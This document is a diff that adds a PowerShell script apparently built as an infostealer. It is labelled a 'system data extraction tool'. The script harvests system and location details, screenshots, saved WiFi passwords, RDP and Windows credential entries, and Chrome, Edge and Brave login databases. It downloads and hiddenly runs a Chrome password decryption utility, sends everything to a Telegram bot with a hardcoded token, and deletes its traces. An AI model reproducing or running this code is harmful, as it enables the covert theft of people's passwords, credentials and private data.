@@ -1,0 +1,620 @@
+# =========================================================
+# COMPLETE SYSTEM DATA EXTRACTION TOOL
+# =========================================================
+# Features:
+# 1. Browser Password Extraction (Chrome, Edge, Brave)
+# 2. WiFi & Network Credentials
+# 3. RDP Connections
+# 4. System Information
+# 5. Screenshot Capture
+# 6. Chrome Password Decryption Tool
+# 7. Telegram Integration
+# =========================================================
+
+# CONFIGURATION
+param(
+    [string]$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w",
+    [string]$y = "2146236602"  
+)
+
+# Global variables
+$systemInfo = $null
+$ipInfo = $null
+$extractPath = "$env:TEMP\ChromeDecryptor"
+
+# ==================== TELEGRAM FUNCTIONS ====================
+
+function Send-TelegramMessage {
+    param([string]$Message)
+    try {
+        $uri = "https://api.telegram.org/bot$x/sendMessage"
+        $body = @{chat_id = $y; text = $Message; parse_mode = "HTML"} | ConvertTo-Json
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
+        if ($response.ok) {
+            Write-Host "✅ Message sent" -ForegroundColor Green
+            return $true
+        }
+        return $false
+    } catch {
+        Write-Host "❌ Telegram error: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+function Send-TelegramFile {
+    param([string]$FilePath, [string]$Caption)
+    try {
+        if (-not (Test-Path $FilePath)) {
+            Write-Host "File not found: $FilePath" -ForegroundColor Red
+            return $false
+        }
+        
+        # Wait for file
+        $maxWaitTime = 30; $waitTime = 0
+        while ($waitTime -lt $maxWaitTime) {
+            try {
+                $file = Get-Item $FilePath
+                if ($file.Length -gt 0) { break }
+            } catch {}
+            Start-Sleep -Seconds 1; $waitTime++
+        }
+        
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "", $y,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"caption`"",
+            "", $Caption,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Type: application/octet-stream",
+            "", $fileEnc,
+            "--$boundary--"
+        ) -join $LF
+
+        $uri = "https://api.telegram.org/bot$x/sendDocument"
+        Write-Host "Sending to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
+        
+        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        
+        if ($response.ok) {
+            Write-Host "✅ File sent successfully" -ForegroundColor Green
+            return $true
+        }
+        return $false
+    } catch {
+        Write-Host "❌ Error sending file: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# ==================== SCREENSHOT FUNCTION ====================
+
+function Capture-Screenshot {
+    Write-Host "📸 Capturing screenshot..." -ForegroundColor Yellow
+    
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        # Set DPI awareness
+        try {
+            $dpiAware = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetProcessDPIAware();' -Name "Win32Utils" -Namespace System -PassThru
+            $dpiAware::SetProcessDPIAware() | Out-Null
+        } catch {}
+        
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size)
+        
+        $path = "$env:TEMP\screen_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+        $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
+        $g.Dispose(); $bmp.Dispose()
+        
+        Write-Host "✅ Screenshot saved" -ForegroundColor Green
+        
+        # Send via curl (more reliable)
+        $caption = "🖥️ $env:COMPUTERNAME | 👤 $env:USERNAME | ⏰ $(Get-Date -Format 'HH:mm:ss')"
+        & "$env:SystemRoot\System32\curl.exe" -s -F "chat_id=$y" -F "document=@$path" "https://api.telegram.org/bot$x/sendDocument" > $null
+        
+        Remove-Item $path -Force
+        Write-Host "✅ Screenshot sent" -ForegroundColor Green
+        return $true
+        
+    } catch {
+        Write-Host "❌ Screenshot failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# ==================== CHROME DECRYPTION TOOL ====================
+
+function Invoke-ChromeDecryption {
+    Write-Host "`n🔓 Chrome Password Decryption Tool" -ForegroundColor Cyan
+    Write-Host "==================================" -ForegroundColor Cyan
+    
+    $zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.3/chrome-injector-v0.17.3.zip"
+    $zipFile = "$extractPath\chrome.zip"
+    
+    # Create folder
+    if (-not (Test-Path $extractPath)) {
+        New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
+    }
+    
+    # Download
+    Write-Host "⬇️  Downloading tool..." -ForegroundColor Yellow
+    try {
+        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile -UseBasicParsing
+        Write-Host "✅ Download complete" -ForegroundColor Green
+    } catch {
+        Write-Host "❌ Download failed" -ForegroundColor Red
+        return
+    }
+    
+    # Extract
+    Write-Host "📦 Extracting files..." -ForegroundColor Yellow
+    try {
+        Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
+        Remove-Item $zipFile -Force
+        Write-Host "✅ Extraction complete" -ForegroundColor Green
+    } catch {
+        Write-Host "❌ Extraction failed" -ForegroundColor Red
+        return
+    }
+    
+    # Find executables
+    Write-Host "🔍 Finding executables..." -ForegroundColor Yellow
+    Set-Location $extractPath
+    
+    $arm64Exe = Get-ChildItem -Filter "*arm64.exe" -Recurse | Select-Object -First 1
+    $x64Exe = Get-ChildItem -Filter "*x64.exe" -Recurse | Select-Object -First 1
+    
+    if (-not $arm64Exe -and -not $x64Exe) {
+        Write-Host "❌ No executables found" -ForegroundColor Red
+        return
+    }
+    
+    Write-Host "Found:" -ForegroundColor Green
+    if ($arm64Exe) { Write-Host "  • $($arm64Exe.Name)" -ForegroundColor Cyan }
+    if ($x64Exe) { Write-Host "  • $($x64Exe.Name)" -ForegroundColor Cyan }
+    
+    # Execute
+    Write-Host "`n🚀 Executing decryption tools..." -ForegroundColor Magenta
+    $processes = @()
+    
+    if ($x64Exe) {
+        Write-Host "🔧 Running $($x64Exe.Name) all..." -ForegroundColor Yellow
+        $process = Start-Process -FilePath $x64Exe.FullName -ArgumentList "all" -PassThru -WindowStyle Hidden
+        $processes += $process
+        Write-Host "✅ x64 started (PID: $($process.Id))" -ForegroundColor Green
+    }
+    
+    if ($arm64Exe) {
+        Write-Host "🔧 Running $($arm64Exe.Name) all..." -ForegroundColor Yellow
+        $process = Start-Process -FilePath $arm64Exe.FullName -ArgumentList "all" -PassThru -WindowStyle Hidden
+        $processes += $process
+        Write-Host "✅ ARM64 started (PID: $($process.Id))" -ForegroundColor Green
+    }
+    
+    # Wait
+    Write-Host "`n⏳ Waiting for execution..." -ForegroundColor Yellow
+    $processes | Wait-Process
+    Write-Host "✅ Execution completed" -ForegroundColor Green
+    
+    # Check output
+    Write-Host "`n🔍 Checking for output folder..." -ForegroundColor Yellow
+    Start-Sleep -Seconds 2
+    $outputFolder = Get-ChildItem -Path $extractPath -Filter "output" -Directory -Recurse | Select-Object -First 1
+    
+    if ($outputFolder -and (Test-Path $outputFolder.FullName)) {
+        Write-Host "✅ Output folder found" -ForegroundColor Green
+        $fileCount = (Get-ChildItem -Path $outputFolder.FullName -Recurse -File).Count
+        Write-Host "  Contains $fileCount files" -ForegroundColor Cyan
+        
+        # Create zip
+        $zipFileName = "Chrome_Decrypt_Output_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+        $zipPath = "$extractPath\$zipFileName"
+        
+        Write-Host "`n📦 Creating zip archive..." -ForegroundColor Yellow
+        try {
+            Compress-Archive -Path $outputFolder.FullName -DestinationPath $zipPath -Force
+            Write-Host "✅ Zip created" -ForegroundColor Green
+            
+            # Send to Telegram
+            Write-Host "📤 Sending to Telegram..." -ForegroundColor Yellow
+            $caption = "🔓 Chrome Decryption Output`n🖥️ $($systemInfo.ComputerName)`n👤 $($systemInfo.UserName)`n📁 Files: $fileCount`n⏰ $(Get-Date -Format 'HH:mm:ss')"
+            
+            if (Send-TelegramFile -FilePath $zipPath -Caption $caption) {
+                Write-Host "✅ Results sent to Telegram!" -ForegroundColor Green
+            }
+            
+            # Cleanup
+            Remove-Item $zipPath -Force
+            Remove-Item $outputFolder.FullName -Recurse -Force
+            Write-Host "🗑️ Output folder cleaned" -ForegroundColor Gray
+            
+        } catch {
+            Write-Host "❌ Zip creation failed" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "❌ No output folder found" -ForegroundColor Red
+    }
+    
+    # Cleanup tool folder
+    Write-Host "`n🧹 Cleaning tool folder..." -ForegroundColor Yellow
+    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Host "✅ Tool folder cleaned" -ForegroundColor Green
+}
+
+# ==================== MAIN PASSWORD EXTRACTION ====================
+
+function Get-PublicIPInfo {
+    try {
+        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
+        return @{
+            PublicIP = $ipInfo.ip
+            Country = $ipInfo.country
+            Region = $ipInfo.region
+            City = $ipInfo.city
+            Org = $ipInfo.org
+            Loc = $ipInfo.loc
+            Timezone = $ipInfo.timezone
+        }
+    } catch {
+        return @{
+            PublicIP = "Unknown"
+            Country = "Unknown"
+            Region = "Unknown"
+            City = "Unknown"
+            Org = "Unknown"
+            Loc = "Unknown"
+            Timezone = "Unknown"
+        }
+    }
+}
+
+function Get-DetailedSystemInfo {
+    try {
+        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
+        $biosInfo = Get-WmiObject -Class Win32_BIOS
+        $processorInfo = Get-WmiObject -Class Win32_Processor
+        $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
+        
+        return @{
+            ComputerName = $env:COMPUTERNAME
+            UserName = $env:USERNAME
+            OSName = $osInfo.Caption
+            OSVersion = $osInfo.Version
+            OSBuild = $osInfo.BuildNumber
+            BIOSSerial = $biosInfo.SerialNumber
+            Processor = $processorInfo.Name
+            ProcessorCores = $processorInfo.NumberOfCores
+            TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
+            SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
+            SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
+            LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
+            MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
+        }
+    } catch {
+        return @{
+            ComputerName = $env:COMPUTERNAME
+            UserName = $env:USERNAME
+            OSName = "Unknown"
+            OSVersion = "Unknown"
+            OSBuild = "Unknown"
+            BIOSSerial = "Unknown"
+            Processor = "Unknown"
+            ProcessorCores = 0
+            TotalMemoryGB = 0
+            SystemManufacturer = "Unknown"
+            SystemModel = "Unknown"
+            LocalIP = "Unknown"
+            MACAddress = "Unknown"
+        }
+    }
+}
+
+function Get-DetailedWiFiInfo {
+    $wifiProfiles = @()
+    try {
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+            $_.ToString().Split(":")[1].Trim()
+        }
+        
+        foreach ($profile in $profiles) {
+            try {
+                $profileInfo = netsh wlan show profile name="$profile" key=clear
+                $profileDetails = @{}
+                
+                foreach ($line in $profileInfo) {
+                    if ($line -match "^\s*([^:]+)\s*:\s*(.+)") {
+                        $key = $matches[1].Trim()
+                        $value = $matches[2].Trim()
+                        $profileDetails[$key] = $value
+                    }
+                }
+                
+                $password = $profileDetails["Key Content"]
+                $wifiProfiles += @{
+                    SSID = $profile
+                    Password = if ($password) { $password } else { "No password" }
+                    Authentication = $profileDetails["Authentication"]
+                    Encryption = $profileDetails["Cipher"]
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            } catch {}
+        }
+    } catch {}
+    
+    return @{
+        Profiles = $wifiProfiles
+        TotalProfiles = $wifiProfiles.Count
+    }
+}
+
+function Get-RDPConnections {
+    $rdpConnections = @()
+    try {
+        $rdpFiles = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.rdp" -ErrorAction SilentlyContinue
+        $rdpFiles += Get-ChildItem -Path "$env:USERPROFILE\Desktop" -Filter "*.rdp" -ErrorAction SilentlyContinue
+        
+        foreach ($rdpFile in $rdpFiles) {
+            try {
+                $content = Get-Content $rdpFile.FullName -ErrorAction Stop
+                $server = ($content | Where-Object { $_ -match "full address:s:" }) -replace "full address:s:", ""
+                $username = ($content | Where-Object { $_ -match "username:s:" }) -replace "username:s:", ""
+                
+                $rdpConnections += @{
+                    FileName = $rdpFile.Name
+                    Server = $server.Trim()
+                    UsernameHint = $username.Trim()
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            } catch {}
+        }
+    } catch {}
+    
+    return $rdpConnections
+}
+
+function Get-WindowsNetworkCredentials {
+    $networkCredentials = @()
+    try {
+        $cmdkeyOutput = cmdkey /list 2>$null
+        $currentTarget = ""
+        foreach ($line in $cmdkeyOutput) {
+            if ($line -match "Target:\s*(.+)") {
+                $currentTarget = $matches[1].Trim()
+            } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
+                $type = $matches[1].Trim()
+                if ($currentTarget -like "TERMSRV/*" -or $currentTarget -like "MicrosoftAccount:target=TERMSRV/*") {
+                    $networkCredentials += @{
+                        Target = $currentTarget
+                        Type = $type
+                        CredentialType = "RDP/Windows"
+                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
+                }
+                $currentTarget = ""
+            }
+        }
+    } catch {}
+    
+    return $networkCredentials
+}
+
+function Install-SQLiteIfNeeded {
+    try {
+        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
+        $tempZip = "sqlite-temp.zip"
+        
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
+        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
+        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
+        
+        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
+        
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+function Extract-BrowserPasswords {
+    $allSummaryData = @()
+    $allDetailedData = @()
+    
+    $browsers = @{
+        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    }
+    
+    foreach ($browserKey in $browsers.Keys) {
+        $browserPath = $browsers[$browserKey]
+        Write-Host "  Processing $browserKey..." -ForegroundColor Yellow
+        
+        if (Test-Path $browserPath) {
+            # Find login data files
+            $loginFiles = @()
+            $defaultLogin = Join-Path $browserPath "Default\Login Data"
+            if (Test-Path $defaultLogin) {
+                $loginFiles += @{Path = $defaultLogin; Profile = "Default"}
+            }
+            
+            foreach ($loginFile in $loginFiles) {
+                try {
+                    $tempDb = "temp_$($browserKey)_$(Get-Random).db"
+                    Copy-Item $loginFile.Path $tempDb -Force
+                    
+                    if (Test-Path ".\sqlite3.exe") {
+                        $sqlitePath = ".\sqlite3.exe"
+                        $tempCsv = "temp_$($browserKey)_$(Get-Random).csv"
+                        $query = "SELECT origin_url, username_value, hex(password_value) as password_hex FROM logins;"
+                        & $sqlitePath -csv -header $tempDb $query > $tempCsv
+                        
+                        if (Test-Path $tempCsv) {
+                            $logins = Import-Csv $tempCsv
+                            foreach ($login in $logins) {
+                                $allSummaryData += @{
+                                    Browser = $browserKey
+                                    Profile = $loginFile.Profile
+                                    URL = $login.origin_url
+                                    Username = $login.username_value
+                                    HexDataPreview = if ($login.password_hex -and $login.password_hex.Length -gt 50) { 
+                                        $login.password_hex.Substring(0, 50) + "..." 
+                                    } else { 
+                                        $login.password_hex 
+                                    }
+                                }
+                            }
+                            Remove-Item $tempCsv -Force
+                        }
+                    }
+                    Remove-Item $tempDb -Force
+                } catch {}
+            }
+        }
+    }
+    
+    return $allSummaryData
+}
+
+# ==================== MAIN EXECUTION ====================
+
+Write-Host "🚀 COMPLETE SYSTEM DATA EXTRACTION" -ForegroundColor Magenta
+Write-Host "="*50 -ForegroundColor Magenta
+
+# Get system info
+Write-Host "`n1️⃣ COLLECTING SYSTEM INFORMATION" -ForegroundColor Cyan
+$systemInfo = Get-DetailedSystemInfo
+$ipInfo = Get-PublicIPInfo
+
+# Send system info to Telegram
+$systemMessage = @"
+🖥️ <b>System Information</b>
+• <b>Computer:</b> $($systemInfo.ComputerName)
+• <b>User:</b> $($systemInfo.UserName)
+• <b>OS:</b> $($systemInfo.OSName)
+• <b>Processor:</b> $($systemInfo.Processor)
+• <b>Memory:</b> $($systemInfo.TotalMemoryGB) GB
+• <b>Local IP:</b> $($systemInfo.LocalIP)
+• <b>MAC Address:</b> $($systemInfo.MACAddress)
+
+🌍 <b>Location Information</b>
+• <b>Public IP:</b> $($ipInfo.PublicIP)
+• <b>Country:</b> $($ipInfo.Country)
+• <b>Region:</b> $($ipInfo.Region)
+• <b>City:</b> $($ipInfo.City)
+• <b>Coordinates:</b> $($ipInfo.Loc)
+
+⏰ <b>Extraction Started:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+
+Send-TelegramMessage -Message $systemMessage | Out-Null
+
+# Take screenshot (runs in parallel)
+Write-Host "`n2️⃣ CAPTURING SCREENSHOT" -ForegroundColor Cyan
+$screenshotJob = Start-Job -ScriptBlock ${function:Capture-Screenshot} -Name "Screenshot"
+
+# Extract WiFi, RDP, Network credentials
+Write-Host "`n3️⃣ EXTRACTING NETWORK CREDENTIALS" -ForegroundColor Cyan
+$wifiData = Get-DetailedWiFiInfo
+$rdpConnections = Get-RDPConnections
+$networkCredentials = Get-WindowsNetworkCredentials
+
+# Extract browser passwords
+Write-Host "`n4️⃣ EXTRACTING BROWSER PASSWORDS" -ForegroundColor Cyan
+if (-not (Test-Path ".\sqlite3.exe")) {
+    Install-SQLiteIfNeeded | Out-Null
+}
+$browserPasswords = Extract-BrowserPasswords
+
+# Create and send network data JSON
+Write-Host "`n5️⃣ SENDING NETWORK DATA" -ForegroundColor Cyan
+$networkData = @{
+    WiFi = $wifiData
+    RDPConnections = $rdpConnections
+    WindowsCredentials = $networkCredentials
+    Metadata = @{
+        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        OS = $systemInfo.OSName
+        User = $systemInfo.UserName
+        Machine = $systemInfo.ComputerName
+        PublicIP = $ipInfo.PublicIP
+        Country = $ipInfo.Country
+        City = $ipInfo.City
+    }
+}
+
+$networkJson = "$env:TEMP\Network_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
+$networkData | ConvertTo-Json -Depth 5 | Out-File -FilePath $networkJson -Encoding UTF8
+$networkCaption = "Network Credentials - $($systemInfo.ComputerName)`nWiFi: $($wifiData.TotalProfiles)`nRDP: $($rdpConnections.Count)`nWindows Creds: $($networkCredentials.Count)"
+Send-TelegramFile -FilePath $networkJson -Caption $networkCaption
+Remove-Item $networkJson -Force -ErrorAction SilentlyContinue
+
+# Create and send browser data JSON
+if ($browserPasswords.Count -gt 0) {
+    Write-Host "`n6️⃣ SENDING BROWSER DATA" -ForegroundColor Cyan
+    $browserData = @{
+        Passwords = $browserPasswords
+        TotalEntries = $browserPasswords.Count
+        Metadata = @{
+            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            OS = $systemInfo.OSName
+            User = $systemInfo.UserName
+            Machine = $systemInfo.ComputerName
+        }
+    }
+    
+    $browserJson = "$env:TEMP\Browser_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
+    $browserData | ConvertTo-Json -Depth 5 | Out-File -FilePath $browserJson -Encoding UTF8
+    $browserCaption = "Browser Passwords - $($systemInfo.ComputerName)`nEntries: $($browserPasswords.Count)`nBrowsers: Chrome, Edge, Brave"
+    Send-TelegramFile -FilePath $browserJson -Caption $browserCaption
+    Remove-Item $browserJson -Force -ErrorAction SilentlyContinue
+}
+
+# Run Chrome decryption tool
+Write-Host "`n7️⃣ RUNNING CHROME DECRYPTION TOOL" -ForegroundColor Cyan
+Invoke-ChromeDecryption
+
+# Wait for screenshot to complete
+Write-Host "`n8️⃣ FINALIZING" -ForegroundColor Cyan
+Wait-Job $screenshotJob -Timeout 30 | Out-Null
+Remove-Job $screenshotJob -Force
+
+# Cleanup
+Write-Host "`n🧹 CLEANING UP" -ForegroundColor Yellow
+Get-ChildItem -Path "." -Filter "temp_*" -ErrorAction SilentlyContinue | Remove-Item -Force
+Get-ChildItem -Path "." -Filter "sqlite3.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
+
+# Final message
+$completionMessage = @"
+✅ <b>EXTRACTION COMPLETE!</b>
+
+🖥️ <b>System:</b> $($systemInfo.ComputerName)
+🌍 <b>Location:</b> $($ipInfo.City), $($ipInfo.Country)
+📊 <b>Browser Entries:</b> $($browserPasswords.Count)
+📶 <b>WiFi Networks:</b> $($wifiData.TotalProfiles)
+🔐 <b>Windows Credentials:</b> $($networkCredentials.Count)
+🖥️ <b>RDP Connections:</b> $($rdpConnections.Count)
+📸 <b>Screenshot:</b> Sent
+🔓 <b>Chrome Decryption:</b> Complete
+⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+
+Send-TelegramMessage -Message $completionMessage
+
+Write-Host "`n" + "="*50 -ForegroundColor Green
+Write-Host "✅ ALL OPERATIONS COMPLETED SUCCESSFULLY!" -ForegroundColor Green
+Write-Host "="*50 -ForegroundColor Green
+
+# =========================================================
